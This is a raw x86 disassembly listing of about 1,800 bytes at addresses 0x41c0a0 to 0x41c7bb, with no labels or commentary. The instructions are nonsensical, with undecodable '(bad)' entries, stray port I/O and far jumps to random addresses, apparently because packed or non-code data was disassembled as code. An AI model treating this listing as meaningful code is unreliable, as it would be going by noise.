  41c0a0:	dec    esp
  41c0a1:	jbe    0x41c0ff
  41c0a3:	idiv   esi
  41c0a5:	call   0x54b6:0x64c1abe
  41c0ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0ad:	jb     0x41c033
  41c0af:	xchg   ebx,eax
  41c0b0:	lods   eax,DWORD PTR ds:[esi]
  41c0b1:	cld    
  41c0b2:	ror    BYTE PTR [ecx+0x6d],0xe4
  41c0b6:	jp     0x41c03e
  41c0b8:	adc    edi,DWORD PTR [edi]
  41c0ba:	imul   edi,DWORD PTR ds:0xa8d35315,0x56
  41c0c1:	into   
  41c0c2:	adc    ebx,ecx
  41c0c4:	adc    eax,0x3706a168
  41c0c9:	popf   
  41c0ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0cb:	into   
  41c0cc:	fsub   DWORD PTR [edx+0x11]
  41c0cf:	and    eax,0xb23e8fd2
  41c0d4:	call   0xeadbeaae
  41c0d9:	xor    BYTE PTR [edi],dh
  41c0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0dc:	shl    DWORD PTR [edx+0x6f],0x82
  41c0e0:	out    0x2a,eax
  41c0e2:	scas   eax,DWORD PTR es:[edi]
  41c0e3:	dec    edx
  41c0e4:	xchg   ebx,eax
  41c0e5:	dec    ebp
  41c0e6:	xchg   BYTE PTR [esi+0x6f],ch
  41c0e9:	xchg   edi,eax
  41c0ea:	xchg   esi,eax
  41c0eb:	pop    esi
  41c0ec:	pop    ds
  41c0ed:	ja     0x41c16d
  41c0ef:	cwde   
  41c0f0:	in     eax,0xcd
  41c0f2:	fs in  al,dx
  41c0f4:	daa    
  41c0f5:	xchg   BYTE PTR [esi-0x266d624d],dh
  41c0fb:	into   
  41c0fc:	mov    esp,0x294e65d8
  41c101:	stos   DWORD PTR es:[edi],eax
  41c102:	adc    esi,ecx
  41c104:	mov    esp,0x3635f0b
  41c109:	add    al,0xb9
  41c10b:	xchg   edx,eax
  41c10c:	sbb    eax,0x35dd042f
  41c111:	mov    ds:0x9aa7b138,al
  41c116:	fcomi  st,st(6)
  41c118:	fsubr  DWORD PTR [edi]
  41c11a:	pusha  
  41c11b:	call   0xd5ed:0xbec164f6
  41c122:	adc    ebp,esi
  41c124:	lods   eax,DWORD PTR ds:[esi]
  41c125:	sar    BYTE PTR [esi-0xe],1
  41c128:	pop    ebp
  41c129:	dec    esi
  41c12a:	xlat   BYTE PTR ds:[ebx]
  41c12b:	fild   QWORD PTR [ebp-0x39cc8064]
  41c131:	xchg   BYTE PTR [ecx+edi*2],cl
  41c134:	icebp  
  41c135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c136:	fsub   QWORD PTR [edi+0x51]
  41c139:	mov    ds:0xeb86adb8,eax
  41c13e:	mov    dh,0x97
  41c140:	inc    esi
  41c141:	jbe    0x41c1c1
  41c143:	mov    WORD PTR [ecx],cs
  41c145:	fdiv   DWORD PTR [edi]
  41c147:	ffree  st(6)
  41c149:	xlat   BYTE PTR ds:[ebx]
  41c14a:	mov    al,0x15
  41c14c:	mov    ds:0x2351c137,al
  41c151:	fcom   QWORD PTR [eax-0x18]
  41c154:	and    edi,ecx
  41c156:	and    DWORD PTR [edi-0x721775c],esp
  41c15c:	cdq    
  41c15d:	sar    BYTE PTR [eax+edx*8],1
  41c160:	xor    eax,0x5e12e03f
  41c165:	or     BYTE PTR [ebx],bl
  41c167:	or     BYTE PTR [ecx],ch
  41c169:	sbb    ah,bl
  41c16b:	icebp  
  41c16c:	arpl   WORD PTR [edi+0x1],si
  41c16f:	into   
  41c170:	ja     0x41c115
  41c172:	pop    ss
  41c173:	leave  
  41c174:	dec    ebx
  41c175:	gs dec esi
  41c177:	push   ebx
  41c178:	repz xor bl,BYTE PTR [eax+0x38]
  41c17c:	sbb    al,ch
  41c17e:	xor    al,0x6a
  41c180:	xchg   DWORD PTR [edi],ebp
  41c182:	and    esp,edi
  41c184:	lds    edx,FWORD PTR [edi]
  41c186:	stc    
  41c187:	mov    edi,0xd25122cf
  41c18c:	xchg   ebx,eax
  41c18d:	stos   BYTE PTR es:[edi],al
  41c18e:	xchg   ecx,eax
  41c18f:	ret    0xa10a
  41c192:	jp     0x41c165
  41c194:	add    al,0x23
  41c196:	sbb    bl,ch
  41c198:	xchg   ebp,eax
  41c199:	pop    edx
  41c19a:	fdivr  QWORD PTR [ebx-0x4a0f4538]
  41c1a0:	arpl   sp,si
  41c1a2:	adc    eax,0xa8fd4f66
  41c1a7:	adc    ebp,DWORD PTR [ebx]
  41c1a9:	int3   
  41c1aa:	js     0x41c22a
  41c1ac:	sahf   
  41c1ad:	dec    ebp
  41c1ae:	sbb    ebp,edi
  41c1b0:	add    DWORD PTR [ebx-0x75],esi
  41c1b3:	ret    
  41c1b4:	sbb    eax,0xa526f435
  41c1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1ba:	mov    cl,0x91
  41c1bc:	(bad)  
  41c1bd:	jae    0x41c1e2
  41c1bf:	dec    edx
  41c1c0:	sbb    eax,0x5fb70205
  41c1c5:	jp     0x41c1a7
  41c1c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1c8:	cmc    
  41c1c9:	lea    esi,[eax]
  41c1cb:	xchg   ebx,eax
  41c1cc:	xchg   edi,eax
  41c1cd:	(bad)  
  41c1cf:	out    0xb8,al
  41c1d1:	mov    ebp,0x6cda1ecc
  41c1d6:	adc    al,0x2d
  41c1d8:	sub    eax,0xc9520c62
  41c1dd:	ret    
  41c1de:	or     ch,BYTE PTR [ebp-0x3a]
  41c1e1:	sbb    al,0x63
  41c1e3:	jae    0x41c1d8
  41c1e5:	call   0xac7a:0x2c2eb021
  41c1ec:	push   ebx
  41c1ed:	mov    ebx,0x42af6ee2
  41c1f2:	in     eax,dx
  41c1f3:	outs   dx,BYTE PTR ds:[esi]
  41c1f4:	xchg   ecx,eax
  41c1f5:	sbb    DWORD PTR [edi+0x5b8b165],eax
  41c1fb:	stc    
  41c1fc:	mov    eax,ds:0xf3488b88
  41c201:	fisubr WORD PTR [ebp+0x75]
  41c204:	push   cs
  41c205:	fwait
  41c206:	and    edx,ecx
  41c208:	popa   
  41c209:	cwde   
  41c20a:	and    al,BYTE PTR [edx]
  41c20c:	sub    ch,dl
  41c20e:	arpl   si,si
  41c210:	dec    eax
  41c211:	sub    dl,BYTE PTR [ebx]
  41c213:	mov    dh,0x5c
  41c215:	pop    ss
  41c216:	mov    ch,0xc4
  41c218:	dec    esp
  41c219:	dec    esp
  41c21a:	xchg   BYTE PTR [eax],ah
  41c21c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c21d:	mov    edx,0x5f97bc00
  41c222:	push   esi
  41c223:	in     eax,0x34
  41c225:	int    0x1a
  41c227:	sahf   
  41c228:	iret   
  41c229:	xchg   DWORD PTR [ebx],esp
  41c22b:	pop    edx
  41c22c:	inc    ebp
  41c22d:	mov    WORD PTR [edi],cs
  41c22f:	sbb    al,BYTE PTR [eax+0x338a7e6]
  41c235:	mov    bh,0x54
  41c237:	push   ebx
  41c238:	xor    eax,DWORD PTR [edx+0x4fa84791]
  41c23e:	je     0x41c247
  41c240:	jnp    0x41c23c
  41c242:	std    
  41c243:	xchg   ebp,eax
  41c244:	nop
  41c245:	out    dx,al
  41c246:	or     BYTE PTR [eax+0x1c],dh
  41c249:	inc    eax
  41c24a:	xor    eax,0x643eed75
  41c24f:	frstor [ebx-0x424c9f06]
  41c255:	add    al,0xbe
  41c257:	test   BYTE PTR [esp+edi*1-0x1075251],bl
  41c25e:	adc    DWORD PTR [edx],edi
  41c260:	call   0x5c5d:0x39ea7d57
  41c267:	lods   eax,DWORD PTR ds:[esi]
  41c268:	pop    esi
  41c269:	sahf   
  41c26a:	adc    DWORD PTR [ebx+0x75],ecx
  41c26d:	fimul  DWORD PTR [eax+0x34]
  41c270:	out    dx,eax
  41c271:	fwait
  41c272:	outs   dx,DWORD PTR ds:[esi]
  41c273:	imul   ebp,DWORD PTR [edi+edi*1],0x62714730
  41c27a:	cld    
  41c27b:	sbb    BYTE PTR [ebx+0x1d],ch
  41c27e:	dec    eax
  41c27f:	pop    es
  41c280:	call   0xbafb89d0
  41c285:	lahf   
  41c286:	sub    cl,bl
  41c288:	lods   al,BYTE PTR ds:[esi]
  41c289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c28a:	das    
  41c28b:	inc    eax
  41c28c:	int    0xbe
  41c28e:	scas   al,BYTE PTR es:[edi]
  41c28f:	inc    edi
  41c290:	repnz out 0x22,eax
  41c293:	xchg   BYTE PTR [esi],bh
  41c295:	mov    esi,0xa9f13967
  41c29a:	dec    edi
  41c29b:	ja     0x41c303
  41c29d:	jne    0x41c2cf
  41c29f:	adc    al,0xe6
  41c2a1:	cdq    
  41c2a2:	cld    
  41c2a3:	xlat   BYTE PTR ds:[ebx]
  41c2a4:	cmp    DWORD PTR [edx+0x59],esp
  41c2a7:	xor    BYTE PTR [esi+eax*2+0x11],al
  41c2ab:	jmp    0xb16191ee
  41c2b0:	cvtps2pd xmm7,QWORD PTR [edx-0x202e665a]
  41c2b7:	pop    edi
  41c2b8:	ret    
  41c2b9:	out    dx,eax
  41c2ba:	push   ds
  41c2bb:	push   ebp
  41c2bc:	cmp    edx,ebx
  41c2be:	ficom  DWORD PTR [eax-0x70]
  41c2c1:	xor    eax,0x26be18d
  41c2c6:	enter  0xbdca,0x4b
  41c2ca:	adc    eax,0x9a99c355
  41c2cf:	jmp    0x1fcf3360
  41c2d4:	xchg   BYTE PTR [edi+ebx*4+0x78],bl
  41c2d8:	add    ch,BYTE PTR [esi+eax*2]
  41c2db:	clc    
  41c2dc:	and    al,0xd9
  41c2de:	idiv   DWORD PTR [ebx+0x38]
  41c2e1:	mov    eax,ds:0xfee8c23d
  41c2e6:	cli    
  41c2e7:	sub    eax,0xe9e30293
  41c2ec:	and    eax,DWORD PTR es:[edi+edx*1+0x2362b048]
  41c2f4:	xchg   edi,eax
  41c2f5:	fsub   QWORD PTR [ecx-0x4dae20e6]
  41c2fb:	icebp  
  41c2fc:	add    ebx,esi
  41c2fe:	lahf   
  41c2ff:	jg     0x41c31a
  41c301:	je     0x41c2ed
  41c303:	dec    ebp
  41c304:	stc    
  41c305:	jno    0x41c2d4
  41c307:	sub    al,0x53
  41c309:	push   ebx
  41c30a:	push   ebx
  41c30b:	in     al,dx
  41c30c:	adc    ah,ah
  41c30e:	jne    0x41c315
  41c310:	movd   DWORD PTR [esi-0x336f8a84],mm0
  41c317:	shr    dl,0x5e
  41c31a:	sbb    BYTE PTR [edx+0x5],bh
  41c31d:	jmp    0x7da42cf
  41c322:	cmp    cl,BYTE PTR [ebx+0x17]
  41c325:	stc    
  41c326:	repz mov ch,0xf4
  41c329:	cs jno 0x41c35a
  41c32c:	push   ecx
  41c32d:	add    esi,edi
  41c32f:	scas   al,BYTE PTR es:[edi]
  41c330:	nop
  41c331:	data16 es fcmovne st,st(7)
  41c335:	fisub  WORD PTR [ebx]
  41c337:	xchg   edx,eax
  41c338:	fcomp  st(5)
  41c33a:	xchg   esp,eax
  41c33b:	jmp    0xaed19397
  41c340:	pop    ds
  41c341:	xchg   si,ax
  41c343:	jp     0x41c32f
  41c345:	in     al,dx
  41c346:	aaa    
  41c347:	or     esp,DWORD PTR [esi-0x21]
  41c34a:	mov    eax,ds:0x5114567
  41c34f:	jns    0x41c393
  41c351:	aam    0x8b
  41c353:	mov    bl,BYTE PTR [ebx-0x24]
  41c356:	cmp    BYTE PTR [edi],dl
  41c358:	xchg   esi,eax
  41c359:	xchg   esi,eax
  41c35a:	xchg   edi,eax
  41c35b:	jnp    0x41c333
  41c35d:	gs jg  0x41c38f
  41c360:	popa   
  41c361:	mov    edi,0x4d73ee93
  41c366:	ja     0x41c31e
  41c368:	dec    ecx
  41c369:	push   eax
  41c36a:	pop    ebx
  41c36b:	icebp  
  41c36c:	out    dx,al
  41c36d:	ret    
  41c36e:	int    0xe0
  41c370:	in     al,dx
  41c371:	stos   DWORD PTR es:[edi],eax
  41c372:	jns    0x41c352
  41c374:	cmp    edx,DWORD PTR [ebx]
  41c376:	mov    al,ds:0x66e44a7a
  41c37b:	addr16 jbe 0x41c394
  41c37e:	inc    edx
  41c37f:	dec    eax
  41c380:	jne    0x41c3c2
  41c382:	sbb    DWORD PTR [ebp-0xa],0xffffff9d
  41c386:	es add esp,esi
  41c389:	jle    0x41c3da
  41c38b:	or     bl,BYTE PTR [ebp-0x75]
  41c38e:	inc    edx
  41c38f:	imul   ecx,DWORD PTR [edx-0x53b07c69],0x7c
  41c396:	ins    DWORD PTR es:[edi],dx
  41c397:	mov    ebx,0x82710262
  41c39c:	xchg   edx,eax
  41c39d:	idiv   BYTE PTR [ebx+0x17]
  41c3a0:	push   esp
  41c3a1:	dec    edx
  41c3a2:	mov    bh,0xfd
  41c3a4:	adc    ecx,ebp
  41c3a6:	rol    DWORD PTR [edi+0x75],0x5f
  41c3aa:	fimul  DWORD PTR [ecx+edi*8-0x7668ca6b]
  41c3b1:	mov    bl,0xde
  41c3b3:	mov    al,0x5
  41c3b5:	xor    eax,DWORD PTR [esi+0x46582e07]
  41c3bb:	pop    esi
  41c3bc:	dec    edx
  41c3bd:	pop    eax
  41c3be:	scas   al,BYTE PTR es:[edi]
  41c3bf:	mov    ecx,DWORD PTR [edx+0x8f54039]
  41c3c5:	add    al,BYTE PTR [edi+0x58]
  41c3c8:	js     0x41c381
  41c3ca:	sbb    al,0x24
  41c3cc:	dec    ecx
  41c3cd:	mov    esi,0x4772138c
  41c3d2:	xchg   esp,eax
  41c3d3:	aas    
  41c3d4:	sub    DWORD PTR [ecx-0x4cf15453],esi
  41c3da:	inc    esp
  41c3db:	add    bh,BYTE PTR [ecx+0x52]
  41c3de:	nop
  41c3df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3e0:	stos   BYTE PTR es:[edi],al
  41c3e1:	inc    esi
  41c3e2:	push   esp
  41c3e3:	mov    bl,0xb2
  41c3e5:	repnz pop ss
  41c3e7:	dec    esi
  41c3e8:	sbb    eax,0xf4df39d7
  41c3ed:	xor    BYTE PTR [edx],0x4a
  41c3f0:	daa    
  41c3f1:	add    eax,0xa369a255
  41c3f6:	retf   0xb8b9
  41c3f9:	ins    DWORD PTR es:[edi],dx
  41c3fa:	outs   dx,BYTE PTR ds:[esi]
  41c3fb:	adc    edi,edx
  41c3fd:	mov    esi,0x112d8c5a
  41c402:	clc    
  41c403:	aad    0x4d
  41c405:	push   eax
  41c406:	jb     0x41c3cf
  41c408:	call   0xcd72:0x50c6c462
  41c40f:	std    
  41c410:	fs mov esi,0x37e6c4e9
  41c416:	pop    ds
  41c417:	sahf   
  41c418:	jecxz  0x41c477
  41c41a:	xchg   edx,eax
  41c41b:	mov    esi,0x794c8851
  41c420:	popf   
  41c421:	mov    edx,0xa15e25f2
  41c426:	cs mov ebx,0x9bd86575
  41c42c:	repnz push cs
  41c42e:	inc    ebp
  41c42f:	mov    edi,DWORD PTR [edi]
  41c431:	test   eax,0xc59e0323
  41c436:	aad    0xe2
  41c438:	in     eax,0xdc
  41c43a:	jo     0x41c49e
  41c43c:	xchg   eax,ebp
  41c43e:	das    
  41c43f:	mov    al,0xa7
  41c441:	jno    0x41c3e5
  41c443:	fiadd  DWORD PTR [ebx+0x10]
  41c446:	addr16 mov esi,0xfb671d1f
  41c44c:	je     0x41c43b
  41c44e:	cmp    al,BYTE PTR [edx+0x5b69dd69]
  41c454:	pop    es
  41c455:	cmp    eax,0x75cabefe
  41c45a:	lock mov ds:0xf4201afe,al
  41c460:	sti    
  41c461:	aaa    
  41c462:	out    dx,al
  41c463:	push   ds
  41c464:	jae    0x41c4a7
  41c466:	inc    esi
  41c467:	in     eax,0x2
  41c469:	mov    esi,0xd80681e5
  41c46e:	jmp    0x41c4cf
  41c470:	fstp   st(2)
  41c472:	inc    esi
  41c473:	fcomi  st,st(0)
  41c475:	rcr    BYTE PTR [ebx-0x56f3a473],cl
  41c47b:	dec    edx
  41c47c:	xchg   edi,eax
  41c47d:	xlat   BYTE PTR ds:[ebx]
  41c47e:	sbb    dl,BYTE PTR [eax-0x1b]
  41c481:	push   ds
  41c482:	fcomp  QWORD PTR [esi-0x37]
  41c485:	and    ecx,0x98d68209
  41c48b:	int    0x64
  41c48d:	mov    edx,0xd8f4ee7f
  41c492:	rcr    dh,0x61
  41c495:	mov    DWORD PTR ds:0x7ded6849,ebp
  41c49b:	sbb    al,0x59
  41c49d:	fisubr WORD PTR [eax-0xd]
  41c4a0:	jbe    0x41c48c
  41c4a2:	jle    0x41c4a9
  41c4a4:	ret    0xa767
  41c4a7:	addr16 cli 
  41c4a9:	leave  
  41c4aa:	jo     0x41c43c
  41c4ac:	xchg   esp,eax
  41c4ad:	(bad)  
  41c4ae:	movlps xmm6,QWORD PTR [ecx]
  41c4b1:	fdivrp st(4),st
  41c4b3:	sbb    ecx,DWORD PTR [eax-0x46dc88bf]
  41c4b9:	jb     0x41c4dd
  41c4bb:	adc    edi,eax
  41c4bd:	nop
  41c4be:	add    DWORD PTR [esp+esi*2+0x72],esi
  41c4c2:	xchg   ecx,eax
  41c4c3:	inc    esp
  41c4c4:	xor    eax,0xa7c6441e
  41c4c9:	clc    
  41c4ca:	aad    0xfb
  41c4cc:	push   ebx
  41c4cd:	idiv   BYTE PTR [edx]
  41c4cf:	mov    ecx,0x83439593
  41c4d4:	cmc    
  41c4d5:	xchg   ebx,eax
  41c4d6:	(bad)  
  41c4d8:	bound  eax,QWORD PTR cs:[ecx+0x1e0003f2]
  41c4df:	popf   
  41c4e0:	stos   BYTE PTR es:[edi],al
  41c4e1:	aad    0x15
  41c4e3:	cld    
  41c4e4:	mov    eax,DWORD PTR [eax]
  41c4e6:	push   ds
  41c4e7:	dec    eax
  41c4e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4e9:	out    dx,eax
  41c4ea:	stc    
  41c4eb:	inc    esp
  41c4ec:	mov    esp,0x3001284b
  41c4f1:	fs aam 0x48
  41c4f4:	jo     0x41c4b3
  41c4f6:	in     al,0x21
  41c4f8:	pop    ds
  41c4f9:	sub    al,0x0
  41c4fb:	sbb    eax,0xfd1d58ab
  41c500:	xchg   esi,eax
  41c501:	dec    ebx
  41c502:	mov    dh,0xc7
  41c504:	sub    bh,bh
  41c506:	mov    al,ds:0x75ac4300
  41c50b:	in     eax,dx
  41c50c:	cdq    
  41c50d:	mov    eax,0x3b073a93
  41c512:	xchg   edi,eax
  41c513:	jge    0x41c4bb
  41c515:	mov    BYTE PTR [edx+0x5a],al
  41c518:	scas   al,BYTE PTR es:[edi]
  41c519:	dec    esp
  41c51a:	xchg   ebp,eax
  41c51b:	dec    esp
  41c51c:	fdivr  DWORD PTR [edi+0x1f9d44f1]
  41c522:	stc    
  41c523:	mov    bh,0xa1
  41c525:	jg     0x41c520
  41c527:	push   0xffffffc0
  41c529:	cmc    
  41c52a:	or     al,0xb2
  41c52c:	mov    DWORD PTR [ebp-0x1f38b5d0],esi
  41c532:	gs mov edx,0x43ea19b2
  41c538:	in     al,dx
  41c539:	mul    BYTE PTR [edx+0x7de42d50]
  41c53f:	cmp    ch,BYTE PTR [edi+0x3173ea5a]
  41c545:	xchg   DWORD PTR [ebp-0x57],ecx
  41c548:	out    dx,eax
  41c549:	scas   eax,DWORD PTR es:[edi]
  41c54a:	imul   ebp,DWORD PTR [ecx-0x5c64f671],0x6f
  41c551:	xor    al,0xfa
  41c553:	add    ah,dl
  41c555:	out    0x66,al
  41c557:	in     eax,0x33
  41c559:	lods   eax,DWORD PTR ds:[esi]
  41c55a:	or     ebx,DWORD PTR [eax+0x75]
  41c55d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c55e:	stos   BYTE PTR es:[edi],al
  41c55f:	push   0xd8488968
  41c564:	jl     0x41c5ae
  41c566:	push   0xffffffa4
  41c568:	(bad)  
  41c56a:	rol    BYTE PTR [ecx+0x23],0x9a
  41c56e:	int    0x91
  41c570:	xchg   edx,eax
  41c571:	int3   
  41c572:	cmp    al,0xdb
  41c574:	imul   ecx,DWORD PTR [ecx-0x1c],0xb01ed2a7
  41c57b:	aas    
  41c57c:	fstp   QWORD PTR [ebp+0x6490cd8c]
  41c582:	shr    BYTE PTR [edx-0x15],1
  41c585:	es sub eax,0x18545543
  41c58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c58c:	das    
  41c58d:	sub    ecx,DWORD PTR cs:[eax+eiz*2+0x4cf24a8a]
  41c595:	outs   dx,BYTE PTR ds:[esi]
  41c596:	fisub  DWORD PTR fs:[esi+0xa52601c]
  41c59d:	bound  ecx,QWORD PTR [ebx+0x50]
  41c5a0:	jmp    0x41c617
  41c5a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5a3:	push   0x501ba8da
  41c5a8:	in     eax,dx
  41c5a9:	inc    edi
  41c5aa:	lahf   
  41c5ab:	dec    edi
  41c5ac:	adc    bh,BYTE PTR [esi+esi*4]
  41c5af:	xor    ebp,DWORD PTR ds:0xe901d090
  41c5b5:	fwait
  41c5b6:	inc    edx
  41c5b7:	sbb    bh,cl
  41c5b9:	sbb    DWORD PTR [ebp-0x31],ecx
  41c5bc:	dec    edi
  41c5bd:	jge    0x41c558
  41c5bf:	push   edi
  41c5c0:	mov    WORD PTR [eax+esi*1],cs
  41c5c3:	scas   eax,DWORD PTR es:[edi]
  41c5c4:	lock ds jge 0x41c5f4
  41c5c8:	jne    0x41c59f
  41c5ca:	sub    al,0xb0
  41c5cc:	idiv   ch
  41c5ce:	or     edi,edx
  41c5d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5d1:	jecxz  0x41c5b6
  41c5d3:	bound  ebx,QWORD PTR [edx-0x7b]
  41c5d6:	jp     0x41c631
  41c5d8:	sbb    ebp,DWORD PTR [ebx-0x38]
  41c5db:	fistp  WORD PTR [ebx]
  41c5dd:	inc    esp
  41c5de:	fs aad 0x52
  41c5e1:	test   al,0x53
  41c5e3:	inc    edx
  41c5e4:	pop    ebp
  41c5e5:	inc    edx
  41c5e6:	mov    al,ds:0xba0c374a
  41c5eb:	xchg   edi,eax
  41c5ec:	mov    ds:0x50a9af59,al
  41c5f1:	jno    0x41c57b
  41c5f3:	and    cl,cl
  41c5f5:	push   esi
  41c5f6:	enter  0xd94e,0x6
  41c5fa:	cmp    dl,BYTE PTR [ecx+0x10784eef]
  41c600:	sub    edx,DWORD PTR [esi]
  41c602:	lds    edi,FWORD PTR [ebp+0x34]
  41c605:	mov    edx,0x30e7114a
  41c60a:	mov    al,ds:0x14528b7f
  41c60f:	mov    ecx,0x6dd21630
  41c614:	sub    ecx,ecx
  41c616:	fs fs daa 
  41c619:	stc    
  41c61a:	inc    edi
  41c61b:	rcl    DWORD PTR ds:0x549bba,cl
  41c621:	mov    DWORD PTR [edi*4+0x1638a423],0xfb6facc4
  41c62c:	jg     0x41c6a2
  41c62e:	pop    ecx
  41c62f:	pop    edi
  41c630:	stos   BYTE PTR es:[edi],al
  41c631:	into   
  41c632:	sub    BYTE PTR [edx+0x79204eac],dl
  41c638:	dec    eax
  41c639:	(bad)  [ebx]
  41c63b:	sub    DWORD PTR [eax+0x26],ebx
  41c63e:	loope  0x41c6b9
  41c640:	pop    es
  41c641:	loopne 0x41c61e
  41c643:	jnp    0x41c6b9
  41c645:	out    dx,eax
  41c646:	push   ecx
  41c647:	loopne 0x41c676
  41c649:	jne    0x41c66a
  41c64b:	cmp    BYTE PTR [ebx],bl
  41c64d:	ss mov esi,0xc0f8f18d
  41c653:	adc    bh,BYTE PTR [edx-0x33]
  41c656:	(bad)  
  41c658:	sub    esp,ecx
  41c65a:	in     al,0xc9
  41c65c:	jae    0x41c61e
  41c65e:	xchg   DWORD PTR ds:0xc9faddf2,esp
  41c664:	sub    ecx,ebx
  41c666:	dec    edx
  41c667:	cmp    esi,ebx
  41c669:	jns    0x41c65c
  41c66b:	inc    edi
  41c66c:	mov    al,ds:0x74388e22
  41c671:	daa    
  41c672:	in     al,dx
  41c673:	sub    esi,ecx
  41c675:	jns    0x41c621
  41c677:	mov    eax,ds:0x8fa64702
  41c67c:	ds push esi
  41c67e:	stc    
  41c67f:	add    al,0x3f
  41c681:	sbb    DWORD PTR [edi+0x6d1a3a29],edx
  41c687:	test   BYTE PTR [ebp-0x22],cl
  41c68a:	sahf   
  41c68b:	(bad)  
  41c68c:	int3   
  41c68d:	das    
  41c68e:	in     al,0x10
  41c690:	je     0x41c659
  41c692:	lods   eax,DWORD PTR ds:[esi]
  41c693:	lahf   
  41c694:	fisub  DWORD PTR [esi]
  41c696:	(bad)  
  41c697:	or     ebx,DWORD PTR [edx-0x8]
  41c69a:	int3   
  41c69b:	(bad)  
  41c69c:	fisttp DWORD PTR [edi+0x3b]
  41c69f:	stc    
  41c6a0:	jg     0x41c65f
  41c6a2:	mov    es,esi
  41c6a4:	iret   
  41c6a5:	outs   dx,DWORD PTR ds:[esi]
  41c6a6:	call   0xb6e8db39
  41c6ab:	sub    al,0x88
  41c6ad:	bnd jle 0x41c6d0
  41c6b0:	aad    0x44
  41c6b2:	dec    ebx
  41c6b3:	int    0xae
  41c6b5:	jae    0x41c659
  41c6b7:	leave  
  41c6b8:	xchg   edx,eax
  41c6b9:	int3   
  41c6ba:	mov    dh,0x94
  41c6bc:	out    0xe4,al
  41c6be:	xacquire xchg DWORD PTR [esi-0x6328dcf],ebp
  41c6c5:	stos   BYTE PTR es:[edi],al
  41c6c6:	lock fild WORD PTR [eax-0x60]
  41c6ca:	iret   
  41c6cb:	pop    edi
  41c6cc:	push   esp
  41c6cd:	sbb    esp,eax
  41c6cf:	aad    0xe3
  41c6d1:	scas   al,BYTE PTR es:[edi]
  41c6d2:	enter  0x560b,0x1c
  41c6d6:	mov    fs,edx
  41c6d8:	(bad)  
  41c6d9:	into   
  41c6da:	cmp    ebx,eax
  41c6dc:	test   dl,ch
  41c6de:	lea    ebx,[esi+0x11]
  41c6e1:	(bad)  [esp+edi*2]
  41c6e4:	push   ecx
  41c6e5:	iret   
  41c6e6:	dec    ecx
  41c6e7:	xor    DWORD PTR [ebx+0x145f4bb8],0x4a17f0d7
  41c6f1:	and    eax,0xb6534bb5
  41c6f6:	add    ebp,DWORD PTR [ebx]
  41c6f8:	sub    eax,0xac397c9e
  41c6fd:	(bad)  
  41c6fe:	retf   0xaf66
  41c701:	mov    ds:0xa5106e58,eax
  41c706:	mov    ds:0xe8fe2c54,eax
  41c70b:	loop   0x41c72f
  41c70d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c70e:	fs test eax,esi
  41c711:	aaa    
  41c712:	xchg   ecx,eax
  41c713:	xchg   edx,eax
  41c714:	loop   0x41c6bc
  41c716:	and    al,0x50
  41c718:	jne    0x41c6cc
  41c71a:	dec    esp
  41c71b:	scas   eax,DWORD PTR es:[edi]
  41c71c:	push   esp
  41c71d:	or     esi,DWORD PTR [esi+esi*2+0x3c]
  41c721:	(bad)  
  41c722:	leave  
  41c723:	sub    eax,0x8a56510b
  41c728:	add    DWORD PTR [eax],edi
  41c72a:	push   ss
  41c72b:	das    
  41c72c:	jb     0x41c714
  41c72e:	cmc    
  41c72f:	push   edi
  41c730:	scas   al,BYTE PTR es:[edi]
  41c731:	adc    eax,0xdc8fa66b
  41c736:	dec    edi
  41c737:	out    0xf8,eax
  41c739:	ret    0x57f2
  41c73c:	xor    DWORD PTR [edi],ebp
  41c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c73f:	lods   al,BYTE PTR ds:[esi]
  41c740:	mov    DWORD PTR ds:0x96764425,eax
  41c746:	shl    DWORD PTR [ebx+esi*2+0x5e],1
  41c74a:	int3   
  41c74b:	mov    cl,0x6
  41c74d:	or     BYTE PTR [bp+si],ah
  41c750:	aad    0x43
  41c752:	or     al,0x36
  41c754:	inc    eax
  41c755:	pusha  
  41c756:	out    0x97,al
  41c758:	ins    BYTE PTR es:[edi],dx
  41c759:	sbb    DWORD PTR [ecx],ebx
  41c75b:	inc    ebp
  41c75c:	cmc    
  41c75d:	ror    BYTE PTR [eax],0x5a
  41c760:	mov    ecx,0x3439ddee
  41c765:	popa   
  41c766:	aad    0x34
  41c768:	test   cl,cl
  41c76a:	dec    ebp
  41c76b:	loop   0x41c7a4
  41c76d:	(bad)  
  41c76e:	cli    
  41c76f:	push   ebx
  41c770:	dec    ecx
  41c771:	xchg   edx,eax
  41c772:	xor    al,0x3f
  41c774:	and    DWORD PTR cs:[edx],ebx
  41c777:	sbb    al,0xe1
  41c779:	mov    esp,0x7424a6c4
  41c77e:	sbb    ch,BYTE PTR [ebp+0x2eb8a7b9]
  41c784:	out    dx,eax
  41c785:	dec    edi
  41c786:	fimul  WORD PTR [edx+eax*2]
  41c789:	rep lods eax,DWORD PTR ds:[esi]
  41c78b:	jmp    0x41c71e
  41c78d:	push   esi
  41c78e:	test   BYTE PTR [eax+0x60c47d3d],0xca
  41c795:	cmp    cl,BYTE PTR [esi+esi*8]
  41c798:	out    0x25,al
  41c79a:	leave  
  41c79b:	push   edx
  41c79c:	sub    al,BYTE PTR [edx]
  41c79e:	enter  0xc213,0xea
  41c7a2:	popf   
  41c7a3:	add    eax,0x4b887a4f
  41c7a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7a9:	mov    WORD PTR [ecx-0x4495410d],?
  41c7af:	or     edi,esp
  41c7b1:	push   0x3b
  41c7b3:	stc    
  41c7b4:	shl    DWORD PTR [esp+edx*2+0x31467f4],1
  41c7bb:	mov    ch,0x4f
